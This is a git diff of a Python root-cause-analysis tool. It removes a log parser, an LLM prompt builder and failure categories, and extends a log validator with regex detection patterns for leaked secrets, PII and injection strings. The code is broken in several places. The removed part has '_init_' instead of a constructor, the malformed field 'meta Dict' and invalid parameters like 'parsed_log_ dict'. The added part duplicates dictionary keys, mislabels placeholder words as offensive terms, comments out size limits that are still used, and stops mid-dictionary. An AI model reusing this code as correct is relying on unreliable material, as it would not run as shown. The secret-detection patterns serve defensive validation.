@@ -1,831 +1,3 @@
-# generic_log_parser.py
-"""
-Generic Log Parser for Root Cause Analysis
-Works with any log format - structured or unstructured
-"""
-
-import re
-from datetime import datetime
-from typing import Dict, List, Optional, Any
-from dataclasses import dataclass, field
-from collections import defaultdict
-
-
-@dataclass
-class LogEntry:
-    """Simple log entry"""
-    line_number: int
-    text: str
-    is_error: bool = False
-    is_warning: bool = False
-    has_exception: bool = False
-    has_stack_trace: bool = False
-    timestamp: Optional[str] = None
-    meta Dict[str, Any] = field(default_factory=dict)
-
-
-@dataclass
-class ParsedLog:
-    """Parsed log result"""
-    all_entries: List[LogEntry]
-    errors: List[LogEntry]
-    warnings: List[LogEntry]
-    exceptions: List[Dict[str, Any]]
-    summary: Dict[str, Any]
-    
-    def to_dict(self) -> Dict:
-        """Convert to dictionary for JSON"""
-        return {
-            "summary": self.summary,
-            "errors": [{"line": e.line_number, "text": e.text} for e in self.errors],
-            "warnings": [{"line": w.line_number, "text": w.text} for w in self.warnings],
-            "exceptions": self.exceptions,
-            "total_lines": len(self.all_entries)
-        }
-
-
-class GenericLogParser:
-    """Simple generic log parser for any format"""
-    
-    ERROR_KEYWORDS = [
-        'error', 'fail', 'failed', 'failure', 'fatal', 'critical',
-        'exception', 'crash', 'abort', 'panic', 'timeout'
-    ]
-    
-    WARNING_KEYWORDS = [
-        'warn', 'warning', 'caution', 'alert', 'deprecat'
-    ]
-    
-    EXCEPTION_PATTERNS = [
-        r'(\w+(?:Error|Exception))[\s:]',
-        r'Traceback \(most recent call last\)',
-        r'Exception in thread',
-        r'Caused by:',
-        r'at \w+\.\w+\(',
-    ]
-    
-    STACK_TRACE_INDICATORS = [
-        r'^\s+at ',
-        r'^\s+File "',
-        r'^\s+in \w+',
-        r'^\s+\d+\s+',
-        r'^\s*---',
-    ]
-    
-    TIMESTAMP_PATTERNS = [
-        r'\d{4}[-/]\d{2}[-/]\d{2}',
-        r'\d{2}[-/]\d{2}[-/]\d{4}',
-        r'\d{2}:\d{2}:\d{2}',
-        r'\d{10,13}',
-    ]
-    
-    def _init_(self, context_lines: int = 3, min_error_length: int = 10):
-        self.context_lines = context_lines
-        self.min_error_length = min_error_length
-    
-    def parse(self, log_text: str) -> ParsedLog:
-        """Parse any log format"""
-        lines = log_text.split('\n')
-        entries = []
-        errors = []
-        warnings = []
-        exceptions = []
-        
-        current_exception = None
-        in_stack_trace = False
-        
-        for line_num, line in enumerate(lines, start=1):
-            if not line.strip():
-                continue
-            
-            entry = LogEntry(
-                line_number=line_num,
-                text=line,
-                timestamp=self._extract_timestamp(line)
-            )
-            
-            # Check for errors
-            if self._is_error_line(line):
-                entry.is_error = True
-                errors.append(entry)
-                
-                exception_type = self._extract_exception_type(line)
-                if exception_type:
-                    entry.has_exception = True
-                    
-                    if current_exception:
-                        exceptions.append(current_exception)
-                    
-                    current_exception = {
-                        'type': exception_type,
-                        'line': line_num,
-                        'message': line.strip(),
-                        'stack_trace': [],
-                        'context_before': self._get_context_before(lines, line_num),
-                        'context_after': []
-                    }
-                    in_stack_trace = True
-            
-            elif self._is_warning_line(line):
-                entry.is_warning = True
-                warnings.append(entry)
-            
-            elif in_stack_trace and self._is_stack_trace_line(line):
-                entry.has_stack_trace = True
-                if current_exception:
-                    current_exception['stack_trace'].append(line.strip())
-            else:
-                if in_stack_trace and current_exception:
-                    current_exception['context_after'] = self._get_context_after(
-                        lines, current_exception['line'], line_num
-                    )
-                in_stack_trace = False
-            
-            entries.append(entry)
-        
-        if current_exception:
-            exceptions.append(current_exception)
-        
-        summary = self._build_summary(entries, errors, warnings, exceptions)
-        
-        return ParsedLog(
-            all_entries=entries,
-            errors=errors,
-            warnings=warnings,
-            exceptions=exceptions,
-            summary=summary
-        )
-    
-    def _is_error_line(self, line: str) -> bool:
-        """Check if line contains error indicators"""
-        line_lower = line.lower()
-        
-        for keyword in self.ERROR_KEYWORDS:
-            if re.search(r'\b' + keyword + r'\b', line_lower):
-                return True
-        
-        for pattern in self.EXCEPTION_PATTERNS:
-            if re.search(pattern, line):
-                return True
-        
-        return False
-    
-    def _is_warning_line(self, line: str) -> bool:
-        """Check if line contains warning indicators"""
-        line_lower = line.lower()
-        for keyword in self.WARNING_KEYWORDS:
-            if re.search(r'\b' + keyword, line_lower):
-                return True
-        return False
-    
-    def _is_stack_trace_line(self, line: str) -> bool:
-        """Check if line is part of stack trace"""
-        if not line[0].isspace():
-            return False
-        
-        for pattern in self.STACK_TRACE_INDICATORS:
-            if re.match(pattern, line):
-                return True
-        return False
-    
-    def _extract_exception_type(self, line: str) -> Optional[str]:
-        """Extract exception type from line"""
-        for pattern in self.EXCEPTION_PATTERNS:
-            match = re.search(pattern, line)
-            if match:
-                if 'Error' in match.group(0) or 'Exception' in match.group(0):
-                    return match.group(1) if match.lastindex else match.group(0).strip()
-        return None
-    
-    def _extract_timestamp(self, line: str) -> Optional[str]:
-        """Extract any timestamp format from line"""
-        for pattern in self.TIMESTAMP_PATTERNS:
-            match = re.search(pattern, line)
-            if match:
-                return match.group(0)
-        return None
-    
-    def _get_context_before(self, lines: List[str], current_line: int) -> List[str]:
-        """Get context lines before error"""
-        start = max(0, current_line - self.context_lines - 1)
-        end = current_line - 1
-        
-        context = []
-        for i in range(start, end):
-            if i < len(lines) and lines[i].strip():
-                context.append(lines[i].strip())
-        return context
-    
-    def _get_context_after(self, lines: List[str], error_line: int, current_line: int) -> List[str]:
-        """Get context lines after error/stack trace"""
-        start = current_line
-        end = min(len(lines), error_line + self.context_lines + 10)
-        
-        context = []
-        for i in range(start, end):
-            if i < len(lines) and lines[i].strip():
-                if not self._is_stack_trace_line(lines[i]):
-                    context.append(lines[i].strip())
-                    if len(context) >= self.context_lines:
-                        break
-        return context
-    
-    def _build_summary(
-        self,
-        entries: List[LogEntry],
-        errors: List[LogEntry],
-        warnings: List[LogEntry],
-        exceptions: List[Dict]
-    ) -> Dict[str, Any]:
-        """Build summary statistics"""
-        
-        exception_types = defaultdict(int)
-        for exc in exceptions:
-            exception_types[exc['type']] += 1
-        
-        total_lines = len(entries)
-        error_density = (len(errors) / total_lines * 100) if total_lines > 0 else 0
-        
-        timestamps = [e.timestamp for e in entries if e.timestamp]
-        
-        return {
-            'total_lines': total_lines,
-            'error_count': len(errors),
-            'warning_count': len(warnings),
-            'exception_count': len(exceptions),
-            'exception_types': dict(exception_types),
-            'error_density': round(error_density, 2),
-            'has_timestamps': len(timestamps) > 0,
-            'timestamp_coverage': round(len(timestamps) / total_lines * 100, 2) if total_lines > 0 else 0
-        }
-    
-    def prepare_for_rca(self, parsed_log: ParsedLog) -> Dict:
-        """Prepare parsed log for RCA LLM processing"""
-        rca_data = {
-            'summary': parsed_log.summary,
-            'critical_errors': [],
-            'all_exceptions': parsed_log.exceptions,
-            'error_patterns': self._identify_error_patterns(parsed_log.errors)
-        }
-        
-        for error in parsed_log.errors[:20]:
-            error_data = {
-                'line_number': error.line_number,
-                'message': error.text.strip(),
-                'timestamp': error.timestamp,
-                'context_before': [],
-                'context_after': []
-            }
-            
-            start_idx = max(0, error.line_number - self.context_lines - 1)
-            end_idx = min(len(parsed_log.all_entries), error.line_number + self.context_lines)
-            
-            for idx in range(start_idx, error.line_number - 1):
-                if idx < len(parsed_log.all_entries):
-                    error_data['context_before'].append(parsed_log.all_entries[idx].text.strip())
-            
-            for idx in range(error.line_number, end_idx):
-                if idx < len(parsed_log.all_entries):
-                    error_data['context_after'].append(parsed_log.all_entries[idx].text.strip())
-            
-            rca_data['critical_errors'].append(error_data)
-        
-        return rca_data
-    
-    def _identify_error_patterns(self, errors: List[LogEntry]) -> Dict[str, int]:
-        """Identify common error patterns"""
-        patterns = defaultdict(int)
-        
-        for error in errors:
-            text = error.text.lower()
-            
-            if 'timeout' in text or 'timed out' in text:
-                patterns['timeout'] += 1
-            elif 'connection' in text or 'connect' in text:
-                patterns['connection_issue'] += 1
-            elif 'permission' in text or 'denied' in text or 'forbidden' in text:
-                patterns['permission_denied'] += 1
-            elif 'not found' in text or '404' in text:
-                patterns['not_found'] += 1
-            elif 'null' in text or 'none' in text:
-                patterns['null_reference'] += 1
-            elif 'assert' in text:
-                patterns['assertion_failure'] += 1
-            elif 'memory' in text or 'oom' in text:
-                patterns['memory_issue'] += 1
-            else:
-                patterns['other'] += 1
-        
-        return dict(patterns)
-
-
-def parse_log_file(file_path: str) -> ParsedLog:
-    """Parse log file with generic parser"""
-    parser = GenericLogParser()
-    
-    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
-        log_text = f.read()
-    
-    return parser.parse(log_text)
-
-
-
-
-# rca_prompt_system.py
-"""
-Complete RCA Prompt System for LLM
-Integrates log parser, categories, and output format
-"""
-
-from typing import Dict
-from config.failure_categories import format_categories_for_prompt
-
-
-# Output format template
-RCA_OUTPUT_FORMAT = """
-PRIMARY ROOT CAUSE: [One-line description]
-
-CATEGORY: [Main Category] → [Subcategory]
-CONFIDENCE SCORE: [High/Medium/Low] ([0.0-1.0 numeric score])
-
-DETAILED ANALYSIS:
-[Explain what went wrong and why, referencing specific log evidence]
-
-KEY EVIDENCE:
-- Line [number]: [Critical log line 1]
-- Line [number]: [Critical log line 2]
-- Line [number]: [Critical log line 3]
-
-CONTRIBUTING FACTORS:
-1. [Primary contributing factor]
-2. [Secondary contributing factor]
-3. [Tertiary contributing factor]
-
-SEVERITY: [Critical/High/Medium/Low]
-IMPACT: [Business/user impact description]
-
-FAILURE TYPE: [Permanent/Transient]
-REQUIRES CODE FIX: [Yes/No]
-REQUIRES CONFIG CHANGE: [Yes/No]
-
-IMMEDIATE RECOMMENDATIONS:
-1. [Action with expected impact]
-2. [Action with expected impact]
-3. [Action with expected impact]
-
-SHORT-TERM FIXES (1-2 weeks):
-1. [Action and benefit]
-2. [Action and benefit]
-
-LONG-TERM PREVENTION (1-3 months):
-1. [Strategic improvement]
-2. [Strategic improvement]
-
-MONITORING & ALERTS:
-- Metrics to Track: [metric1, metric2, metric3]
-- Alert Thresholds: [threshold details]
-
-PREVENTION STRATEGY:
-[How to prevent this in the future with specific steps]
-"""
-
-
-def build_log_context(parsed_log_ dict) -> str:
-    """Build formatted log context from parsed data"""
-    context = "=== LOG CONTEXT ===\n\n"
-    
-    # Summary
-    context += "*SUMMARY:*\n"
-    context += f"- Total Lines: {parsed_log_data['summary']['total_lines']}\n"
-    context += f"- Errors: {parsed_log_data['summary']['error_count']}\n"
-    context += f"- Warnings: {parsed_log_data['summary']['warning_count']}\n"
-    context += f"- Exceptions: {parsed_log_data['summary']['exception_count']}\n"
-    
-    # Exception types
-    if parsed_log_data['summary'].get('exception_types'):
-        context += f"\n*EXCEPTION TYPES:*\n"
-        for exc_type, count in parsed_log_data['summary']['exception_types'].items():
-            context += f"- {exc_type}: {count}\n"
-    
-    # Error patterns
-    if parsed_log_data.get('error_patterns'):
-        context += f"\n*ERROR PATTERNS:*\n"
-        for pattern, count in parsed_log_data['error_patterns'].items():
-            context += f"- {pattern.replace('_', ' ').title()}: {count}\n"
-    
-    # Critical errors with context
-    context += f"\n*CRITICAL ERRORS:*\n"
-    for idx, error in enumerate(parsed_log_data['critical_errors'][:5], 1):
-        context += f"\n--- Error #{idx} (Line {error['line_number']}) ---\n"
-        
-        if error.get('timestamp'):
-            context += f"Time: {error['timestamp']}\n"
-        
-        if error.get('context_before'):
-            context += "Before:\n"
-            for line in error['context_before'][-2:]:
-                context += f"  {line}\n"
-        
-        context += f">>> {error['message']}\n"
-        
-        if error.get('context_after'):
-            context += "After:\n"
-            for line in error['context_after'][:2]:
-                context += f"  {line}\n"
-    
-    # Detailed exceptions
-    if parsed_log_data.get('all_exceptions'):
-        context += f"\n*EXCEPTION DETAILS:*\n"
-        for idx, exc in enumerate(parsed_log_data['all_exceptions'][:3], 1):
-            context += f"\n--- Exception #{idx}: {exc['type']} ---\n"
-            context += f"Message: {exc['message']}\n"
-            
-            if exc.get('stack_trace'):
-                context += "Stack Trace:\n"
-                for line in exc['stack_trace'][:6]:
-                    context += f"  {line}\n"
-    
-    return context
-
-
-def generate_rca_prompt(parsed_log_ dict) -> Dict[str, str]:
-    """
-    Generate complete RCA prompt for LLM
-    
-    Args:
-        parsed_log_ Output from generic_log_parser.prepare_for_rca()
-        
-    Returns:
-        Dictionary with system and user prompts
-    """
-    
-    system_instruction = """You are an expert Root Cause Analysis (RCA) AI system.
-
-Analyze the provided log context and classify the failure using the comprehensive category reference.
-
-Select ONE primary category and ONE subcategory that best matches the failure.
-Use the provided indicators, examples, and descriptions to guide your classification.
-
-Follow the specified output format exactly."""
-
-    # Get formatted categories
-    categories_text = format_categories_for_prompt()
-    
-    # Build log context
-    log_context = build_log_context(parsed_log_data)
-    
-    # User prompt
-    user_prompt = f"""{categories_text}
-
-{log_context}
-
-Analyze this failure and provide your response in the following format:
-
-{RCA_OUTPUT_FORMAT}"""
-
-    return {
-        "system": system_instruction,
-        "user": user_prompt
-    }
-
-
-def format_for_openai(system_prompt: str, user_prompt: str) -> list:
-    """Format prompts for OpenAI API"""
-    return [
-        {"role": "system", "content": system_prompt},
-        {"role": "user", "content": user_prompt}
-    ]
-
-
-def format_for_anthropic(system_prompt: str, user_prompt: str) -> dict:
-    """Format prompts for Anthropic Claude API"""
-    return {
-        "system": system_prompt,
-        "messages": [{"role": "user", "content": user_prompt}]
-    }
-
-
-
-# config/failure_categories.py
-"""
-Comprehensive Failure Categories for RCA
-"""
-
-FAILURE_CATEGORIES = {
-    # ============================================
-    # 1. PRODUCT/APPLICATION ISSUES
-    # ============================================
-    
-    "Application Defect": {
-        "description": "Bug in the application under test",
-        "sub_categories": [
-            "Functional - Business logic or calculation errors",
-            "API/Backend - REST API, microservices, server errors",
-            "UI/Frontend - Interface rendering, display, user interaction issues",
-            "Database - Data persistence, retrieval, integrity problems",
-            "Integration - Service-to-service communication failures"
-        ],
-        "examples": [
-            "Wrong calculation result",
-            "API returns 500 error",
-            "Button doesn't respond to click",
-            "Data not saved to database",
-            "Service call timeout between microservices"
-        ],
-        "indicators": [
-            "expected != actual in business logic",
-            "5xx status codes",
-            "element not responding",
-            "data mismatch",
-            "integration failure"
-        ]
-    },
-    
-    # ============================================
-    # 2. TEST AUTOMATION ISSUES
-    # ============================================
-    
-    "Test Automation Issue": {
-        "description": "Problem with test code, not the application",
-        "sub_categories": [
-            "Test Logic - Wrong assertions, incorrect expected values",
-            "Locators - UI element selectors incorrect or outdated",
-            "Synchronization - Missing waits, timing issues in test",
-            "Test Design - Flawed test approach or validation"
-        ],
-        "examples": [
-            "Test checking wrong field",
-            "CSS selector changed after UI update",
-            "Test doesn't wait for page load",
-            "Assertion validates non-critical behavior"
-        ],
-        "indicators": [
-            "element not found",
-            "stale element reference",
-            "test logic error",
-            "premature assertion"
-        ]
-    },
-    
-    # ============================================
-    # 3. TEST DATA ISSUES
-    # ============================================
-    
-    "Test Data Issue": {
-        "description": "Problems with test data or test accounts",
-        "sub_categories": [
-            "Invalid/Missing Data - Required data not available",
-            "Expired Credentials - Test accounts locked or expired",
-            "Data Isolation - Tests interfering with each other",
-            "Data Dependencies - Prerequisite data not set up"
-        ],
-        "examples": [
-            "Test user account locked",
-            "Required product data missing",
-            "Parallel tests using same data",
-            "Database not seeded with test data"
-        ],
-        "indicators": [
-            "user not found",
-            "invalid credentials",
-            "data not available",
-            "constraint violation",
-            "duplicate key error"
-        ]
-    },
-    
-    # ============================================
-    # 4. ENVIRONMENT/INFRASTRUCTURE
-    # ============================================
-    
-    "Environment Issue": {
-        "description": "Infrastructure, deployment, or configuration problems",
-        "sub_categories": [
-            "Service Down - Application or services unavailable",
-            "Configuration - Wrong settings, missing env variables",
-            "Deployment - Service restart, rollout in progress",
-            "Resources - Memory, disk, CPU exhaustion"
-        ],
-        "examples": [
-            "Test environment offline",
-            "Wrong API endpoint URL in config",
-            "Pod restarting during test",
-            "Out of memory error"
-        ],
-        "indicators": [
-            "connection refused",
-            "503 service unavailable",
-            "502 bad gateway",
-            "configuration error",
-            "OOM killed",
-            "disk full"
-        ]
-    },
-    
-    # ============================================
-    # 5. NETWORK/CONNECTIVITY
-    # ============================================
-    
-    "Network/Timeout Issue": {
-        "description": "Network communication or performance problems",
-        "sub_categories": [
-            "Connectivity - Network failures, DNS, firewall",
-            "Timeout - Operations exceeding time limits",
-            "Performance - Slow response times"
-        ],
-        "examples": [
-            "DNS resolution failed",
-            "API response took 60 seconds",
-            "Network timeout after 30s",
-            "Firewall blocking request"
-        ],
-        "indicators": [
-            "timeout",
-            "DNS error",
-            "connection timed out",
-            "network unreachable",
-            "slow response"
-        ]
-    },
-    
-    # ============================================
-    # 6. EXTERNAL DEPENDENCIES
-    # ============================================
-    
-    "External Dependency Failure": {
-        "description": "Third-party services or tools failing",
-        "sub_categories": [
-            "Third-Party API - External services down or rate limited",
-            "Browser/Driver - Selenium, WebDriver issues",
-            "Cloud Services - AWS, Azure, GCP outages"
-        ],
-        "examples": [
-            "Payment gateway unavailable",
-            "OAuth provider down",
-            "WebDriver crashed",
-            "S3 bucket unreachable"
-        ],
-        "indicators": [
-            "third party",
-            "external service",
-            "rate limit",
-            "webdriver",
-            "browser crashed"
-        ]
-    },
-    
-    # ============================================
-    # 7. TIMING/FLAKINESS
-    # ============================================
-    
-    "Intermittent/Flaky": {
-        "description": "Non-deterministic or timing-dependent failures",
-        "sub_categories": [
-            "Race Condition - Concurrent operations conflicting",
-            "Flaky Test - Random, non-reproducible failures",
-            "Timing Dependent - Works sometimes, fails other times"
-        ],
-        "examples": [
-            "Passes on retry",
-            "Works locally, fails in CI",
-            "Concurrent modification error",
-            "Time-based behavior variation"
-        ],
-        "indicators": [
-            "intermittent",
-            "race condition",
-            "concurrent modification",
-            "non-deterministic",
-            "random failure"
-        ]
-    },
-    
-    # ============================================
-    # 8. SECURITY/ACCESS
-    # ============================================
-    
-    "Security/Access Issue": {
-        "description": "Authentication, authorization, or security problems",
-        "sub_categories": [
-            "Authentication - Login, token validation failures",
-            "Authorization - Permission denied, access control",
-            "Security Policy - CORS, SSL, certificate issues"
-        ],
-        "examples": [
-            "Token expired",
-            "User lacks permission",
-            "CORS policy violation",
-            "SSL certificate invalid"
-        ],
-        "indicators": [
-            "401 unauthorized",
-            "403 forbidden",
-            "CORS error",
-            "SSL error",
-            "authentication failed"
-        ]
-    },
-    
-    # ============================================
-    # 9. SPECIAL CATEGORIES
-    # ============================================
-    
-    "Known Issue": {
-        "description": "Expected failure due to documented limitation",
-        "sub_categories": [
-            "Feature Not Implemented - Planned but not yet developed",
-            "Documented Bug - Known issue in backlog",
-            "Technical Debt - Existing limitation"
-        ],
-        "examples": [
-            "Feature scheduled for next sprint",
-            "Bug ticket XYZ-123 already exists",
-            "Legacy system limitation"
-        ],
-        "indicators": [
-            "known issue",
-            "expected failure",
-            "backlog item"
-        ]
-    },
-    
-    "Blocked/Cannot Execute": {
-        "description": "Test cannot run due to earlier failure",
-        "sub_categories": [
-            "Prerequisite Failed - Setup or login failed",
-            "Dependency - Required test or service failed",
-            "Environment Not Ready - Setup incomplete"
-        ],
-        "examples": [
-            "Login test failed, cannot proceed",
-            "Database seed script failed",
-            "Required service not deployed"
-        ],
-        "indicators": [
-            "blocked",
-            "prerequisite",
-            "setup failed",
-            "cannot proceed"
-        ]
-    },
-    
-    "Needs Investigation": {
-        "description": "Insufficient information to classify definitively",
-        "sub_categories": [
-            "Insufficient Logs - Not enough diagnostic information",
-            "New Pattern - Previously unseen error",
-            "Complex Failure - Multiple contributing factors"
-        ],
-        "examples": [
-            "Generic error with no details",
-            "New error pattern after deployment",
-            "Multiple services failed simultaneously"
-        ],
-        "indicators": [
-            "unknown error",
-            "unclear cause",
-            "minimal logs"
-        ]
-    }
-}
-
-
-def format_categories_for_prompt() -> str:
-    """Format categories dictionary as readable text for LLM prompt"""
-    output = ["=== FAILURE CATEGORY REFERENCE ===\n"]
-    
-    for idx, (category, details) in enumerate(FAILURE_CATEGORIES.items(), 1):
-        output.append(f"\n*{idx}. {category.upper()}*")
-        output.append(f"Description: {details['description']}\n")
-        
-        output.append("Sub-categories:")
-        for sub in details['sub_categories']:
-            output.append(f"  • {sub}")
-        
-        output.append("\nExamples:")
-        for example in details['examples'][:3]:
-            output.append(f"  - {example}")
-        
-        output.append("\nKey Indicators:")
-        indicators_str = ", ".join(details['indicators'][:5])
-        output.append(f"  {indicators_str}")
-        output.append("")
-    
-    return "\n".join(output)
-
-
-def get_category_list() -> list:
-    """Get list of all main categories"""
-    return list(FAILURE_CATEGORIES.keys())
-
-
-def get_subcategories(main_category: str) -> list:
-    """Get subcategories for a main category"""
-    if main_category in FAILURE_CATEGORIES:
-        return FAILURE_CATEGORIES[main_category]['sub_categories']
-    return []
-
-
 # log_validator.py
 """
 Enterprise-Grade Log Input Validator
@@ -844,9 +16,9 @@ from enum import Enum
 
 # Configure logging
 logging.basicConfig(level=logging.INFO)
-logger = logging.getLogger(_name_)
+logger = logging.getLogger(__name__)
 
-
+# Defines how severe a detected issue is — from minor info to critical error
 class SeverityLevel(Enum):
     """Validation severity levels"""
     CRITICAL = "critical"  # Block processing
@@ -855,7 +27,7 @@ class SeverityLevel(Enum):
     LOW = "low"          # Info only
     INFO = "info"        # Informational
 
-
+# Stores details about a single validation problem (severity, type, message, and fix suggestion)
 @dataclass
 class ValidationIssue:
     """Individual validation issue"""
@@ -865,7 +37,7 @@ class ValidationIssue:
     location: Optional[str] = None
     recommendation: str = ""
 
-
+# Holds the overall result of log validation, including validity, issues found, and cleaned log data
 @dataclass
 class ValidationResult:
     """Log validation result"""
@@ -876,10 +48,12 @@ class ValidationResult:
     metadata: Dict = field(default_factory=dict)
     sanitized_log: Optional[str] = None
     
+    # Returns all issues that are critical or high severity from the validation results
     def get_critical_issues(self) -> List[ValidationIssue]:
         """Get critical/high severity issues"""
         return [i for i in self.issues if i.severity in [SeverityLevel.CRITICAL, SeverityLevel.HIGH]]
     
+    # Converts the validation result and its issues into a dictionary format for easy export or JSON output.
     def to_dict(self) -> Dict:
         """Convert to dictionary"""
         return {
@@ -898,15 +72,16 @@ class ValidationResult:
             ],
             "metadata": self.metadata
         }
-
+    
+# Patterns that indicate encoded/obfuscated/suspicious content (possible exfiltration or malware).
 
 class LogValidator:
     """Production-ready log input validator"""
     
     # Size limits
-    MAX_LOG_SIZE = 10 * 1024 * 1024  # 10MB
-    MAX_LINE_LENGTH = 50000
-    MAX_LINES = 100000
+    #MAX_LOG_SIZE = 10 * 1024 * 1024  # 10MB
+    #MAX_LINE_LENGTH = 50000
+   # MAX_LINES = 100000
     
     # PII patterns
     PII_PATTERNS = {
@@ -919,37 +94,247 @@ class LogValidator:
         'token': r'(?i)(bearer|token|jwt)[\s:=]+[\'"]?([a-zA-Z0-9_\-\.]{20,})[\'"]?',
         'password': r'(?i)(password|passwd|pwd)[\s:=]+[\'"]?([^\s\'"]{6,})[\'"]?',
         'aws_key': r'(?:AKIA|A3T|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}',
-        'private_key': r'-----BEGIN (?:RSA |EC )?PRIVATE KEY-----'
+        'private_key': r'-----BEGIN (?:RSA |EC )?PRIVATE KEY-----',
+        
+        'passport_number': r'\b[A-PR-WYa-pr-wy][1-9]\d\s?\d{4}[1-9]\b',  # Generic passport
+         'aadhaar': r'\b\d{4}\s\d{4}\s\d{4}\b',  # Indian Aadhaar
+         'pan_number': r'\b[A-Z]{5}[0-9]{4}[A-Z]\b',  # Indian PAN
+        'driver_license': r'\b[A-Z]{1,2}\d{2}\s?\d{11}\b',  # Generic DL
+
+        #  Financial Info
+        'credit_card': r'\b(?:\d{4}[-\s]?){3}\d{4}\b',
+        'bank_account': r'\b\d{9,18}\b',  # Generic account number
+        'ifsc_code': r'\b[A-Z]{4}0[A-Z0-9]{6}\b',  # Indian IFSC code
+        'iban': r'\b[A-Z]{2}\d{2}[A-Z0-9]{1,30}\b',  # International bank account
+
+        #  Digital Identifiers
+        'email': r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',
+        'username': r'(?i)(username|user_name|login)[\s:=]+[\'"]?[\w.@-]+[\'"]?',
+        'ip_address': r'\b(?:\d{1,3}\.){3}\d{1,3}\b',
+        'mac_address': r'\b([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})\b',
+
+        #  Secrets & Tokens
+        'api_key': r'(?i)(api[-]?key|apikey|api[-]?secret)[\s:=]+[\'"]?([a-zA-Z0-9_\-]{20,})[\'"]?',
+        'token': r'(?i)(bearer|token|jwt)[\s:=]+[\'"]?([a-zA-Z0-9_\-\.]{20,})[\'"]?',
+        'auth_header': r'(?i)authorization:\s?bearer\s[a-zA-Z0-9\-_.]+',
+        'password': r'(?i)(password|passwd|pwd)[\s:=]+[\'"]?([^\s\'"]{6,})[\'"]?',
+        'aws_key': r'(?:AKIA|A3T|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}',
+        'azure_key': r'(?i)(azure[-_ ]?(key|token|secret))[\s:=]+[\'"]?[a-zA-Z0-9_\-]{20,}[\'"]?',
+        'private_key': r'-----BEGIN (?:RSA |EC )?PRIVATE KEY-----',
+        'client_secret': r'(?i)(client[-_ ]?secret)[\s:=]+[\'"]?[a-zA-Z0-9_\-]{10,}[\'"]?',
+        'firebase_token': r'AAA[a-zA-Z0-9_-]{7,}',
+
+        #  Contact Details
+        'phone': r'\b(?:\+?1[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}\b',
+        'intl_phone': r'\+\d{1,3}[-\s]?\d{1,4}[-\s]?\d{4,10}',
+
+        #  Address or Geo Info
+        'address': r'\b\d{1,4}\s[\w\s.,-]+(street|st|road|rd|lane|ln|ave|avenue|block)\b',
+        'zipcode': r'\b\d{5}(-\d{4})?\b',
+
+        #🧬 Healthcare or Insurance
+        'medical_id': r'\b\d{10,12}\b',
+        'insurance_number': r'\b[A-Z]{2}\d{6,10}\b',
+        'medical_terms': r'(?i)\b(HIPAA|diagnosis|patient_id|lab_results)\b',
+        'ssn_unformatted': r'\b\d{9}\b',  # SSN without dashes
+        'crypto_wallet': r'\b(0x[a-fA-F0-9]{40})\b',  # Ethereum-like wallet
+        'jwt_token': r'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+',  # JWT format
+
+
+        #  Device / System Info
+        'machine_id': r'\b[A-F0-9]{8}-[A-F0-9]{4}-[A-F0-9]{4}-[A-F0-9]{4}-[A-F0-9]{12}\b',  # UUIDs
+        'session_id': r'(?i)(session[-_]?id)[\s:=]+[\'"]?[a-zA-Z0-9\-]{8,}[\'"]?',
+        'cookie': r'(?i)(cookie|set-cookie)[:=]\s?[A-Za-z0-9_\-=%]+'
+        
     }
+       
+
+
+
+    BANNED_TEXT_PATTERNS = {
+        #  Common offensive or placeholder terms
+        'offensive_terms': r'\b(dummy|test123|xyzpassword|foobar|loremipsum|tempuser|testuser|sampleuser)\b',
+
+        #  Hardcoded credentials or passwords
+        'hardcoded_passwords': r'(?i)password\s*=\s*[\'"].+[\'"]',
+        'hardcoded_usernames': r'(?i)username\s*=\s*[\'"].+[\'"]',
+        'hardcoded_tokens': r'(?i)token\s*=\s*[\'"].+[\'"]',
+        'hardcoded_client_secret': r'(?i)client[_-]?secret\s*=\s*[\'"].+[\'"]',
+
+        #  API key or secret exposure
+        'api_key_exposure': r'(?i)api[_-]?key\s*[:=]\s*[\'"].+[\'"]',
+        'secret_key_exposure': r'(?i)secret[_-]?key\s*[:=]\s*[\'"].+[\'"]',
+        'bearer_token_exposure': r'(?i)authorization\s*:\s*bearer\s+[a-zA-Z0-9._\-]+',
+
+        #  Internal or staging URLs
+        'internal_urls': r'https?:\/\/(dev|staging|internal|qa|sandbox|local)\.',
+        'localhost_references': r'https?:\/\/(localhost|127\.0\.0\.1)(:\d+)?',
+
+        #  Secrets or sensitive keywords
+        'secrets': r'(?i)(secret|token|key|passwd|credentials)\s*[:=]',
+        'confidential_data': r'(?i)(confidential|classified|restricted)\s+data',
+
+        #  Debug or testing artifacts
+        'debug_statements': r'(?i)(debug|print|console\.log)\(',
+        'todo_notes': r'(?i)\b(todo|fixme|hack|tempfix)\b',
+        'mock_data': r'(?i)(mock|fake|placeholder|sample)\s+(data|value|info)',
+
+        #  Deprecated or internal configurations
+        'deprecated_config': r'(?i)(deprecated|legacy|internal_use_only)',
+        'internal_identifiers': r'(?i)(internal_id|sys_internal|admin_token)',
+
+        #  SSH, encryption, or private key references
+        'ssh_private_key': r'-----BEGIN (?:RSA |DSA |EC )?PRIVATE KEY-----',
+        'encryption_keys': r'(?i)(encryption|ssl|tls|pgp)[_-]?(key|secret)\s*[:=]\s*[\'"].+[\'"]',
+
+        #  Cloud or environment credentials
+        'aws_secret': r'(?i)aws[_-]?secret[_-]?access[_-]?key\s*[:=]\s*[\'"].+[\'"]',
+        'gcp_service_key': r'(?i)(gcp|google)_?service(_?account)?_?key\s*[:=]\s*[\'"].+[\'"]',
+        'azure_connection_string': r'(?i)azure[_-]?connection[_-]?string\s*[:=]\s*[\'"].+[\'"]',
+
+        #  Environment leaks
+        'env_file_exposure': r'(?i)(dotenv|\.env|environment)\s*(file|var)?\s*[:=]',
+        'config_leak': r'(?i)(config|settings|properties|secrets?)\s*[:=]\s*[\'"].+[\'"]',
+        }
+
+   
+
+ 
     
     # Log injection patterns
     INJECTION_PATTERNS = {
-        'command_injection': r'[;&|`$(){}]',
-        'path_traversal': r'\.\.[/\\]',
-        'null_byte': r'\x00',
-        'script_tag': r'<script[^>]>.?</script>',
-        'sql_injection': r'(?i)(union|select|insert|update|delete|drop|exec|execute)\s',
